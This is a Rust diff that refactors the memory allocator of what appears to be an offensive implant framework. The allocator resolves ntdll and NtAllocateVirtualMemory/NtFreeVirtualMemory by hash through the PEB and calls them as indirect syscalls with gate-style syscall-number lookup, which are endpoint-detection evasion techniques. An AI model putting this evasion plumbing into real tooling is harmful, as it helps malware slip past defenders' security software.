@@ -9,10 +9,15 @@ use core::{
 };
 
 use kageshirei_indirect_syscall::run;
-use kageshirei_win32::ntapi::NtSyscall;
-use mod_agentcore::ldr::{ldr_function_addr, ldr_module_peb};
+use mod_agentcore::ldr::{peb_get_function_addr, peb_get_module};
 use mod_hhtgates::get_syscall_number;
 use spin::Mutex;
+
+pub struct NtAllocSyscall {
+    pub address: *mut u8,
+    pub number:  u16,
+    pub hash:    usize,
+}
 
 // Atomic flag contains the last status of an NT syscall.
 pub static NT_ALLOCATOR_STATUS: AtomicIsize = AtomicIsize::new(0);
@@ -22,9 +27,11 @@ static INIT: AtomicBool = AtomicBool::new(false);
 
 // Static variables to hold the configuration and syscall information, wrapped in UnsafeCell for
 // interior mutability.
-static mut NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> = Mutex::new(UnsafeCell::new(None));
+static mut NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtAllocSyscall>>> =
+    Mutex::new(UnsafeCell::new(None));
 
-static mut NT_FREE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> = Mutex::new(UnsafeCell::new(None));
+static mut NT_FREE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtAllocSyscall>>> =
+    Mutex::new(UnsafeCell::new(None));
 
 /// Unsafe function to perform the initialization of the static variables.
 /// This includes locating and storing the addresses and syscall numbers for
@@ -37,11 +44,11 @@ pub unsafe fn initialize() {
         const NT_FREE_VIRTUAL_MEMORY_DBJ2: usize = 0x2802c609;
 
         // Get the address of ntdll module in memory.
-        let ntdll_address = ldr_module_peb(NTDLL_HASH);
+        let ntdll_address = peb_get_module(NTDLL_HASH);
 
         // Initialize the syscall for NtAllocateVirtualMemory.
-        let alloc_syscall_address = ldr_function_addr(ntdll_address, NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2);
-        let alloc_syscall = NtSyscall {
+        let alloc_syscall_address = peb_get_function_addr(ntdll_address, NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2);
+        let alloc_syscall = NtAllocSyscall {
             address: alloc_syscall_address,
             number:  get_syscall_number(alloc_syscall_address),
             hash:    NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2,
@@ -50,8 +57,8 @@ pub unsafe fn initialize() {
         *NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL.lock().get() = Some(alloc_syscall);
 
         // Initialize the syscall for NtFreeVirtualMemory.
-        let free_syscall_address = ldr_function_addr(ntdll_address, NT_FREE_VIRTUAL_MEMORY_DBJ2);
-        let free_syscall = NtSyscall {
+        let free_syscall_address = peb_get_function_addr(ntdll_address, NT_FREE_VIRTUAL_MEMORY_DBJ2);
+        let free_syscall = NtAllocSyscall {
             address: free_syscall_address,
             number:  get_syscall_number(free_syscall_address),
             hash:    NT_FREE_VIRTUAL_MEMORY_DBJ2,
@@ -76,7 +83,7 @@ fn ensure_initialized() {
 
 /// Function to get a reference to the NtAllocateVirtualMemory syscall, ensuring initialization
 /// first.
-fn get_nt_allocate_virtual_memory_syscall() -> &'static NtSyscall {
+fn get_nt_allocate_virtual_memory_syscall() -> &'static NtAllocSyscall {
     ensure_initialized();
     unsafe {
         NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL
@@ -90,7 +97,7 @@ fn get_nt_allocate_virtual_memory_syscall() -> &'static NtSyscall {
 }
 
 /// Function to get a reference to the NtFreeVirtualMemory syscall, ensuring initialization first.
-fn get_nt_free_virtual_memory_syscall() -> &'static NtSyscall {
+fn get_nt_free_virtual_memory_syscall() -> &'static NtAllocSyscall {
     ensure_initialized();
     unsafe {
         NT_FREE_VIRTUAL_MEMORY_SYSCALL
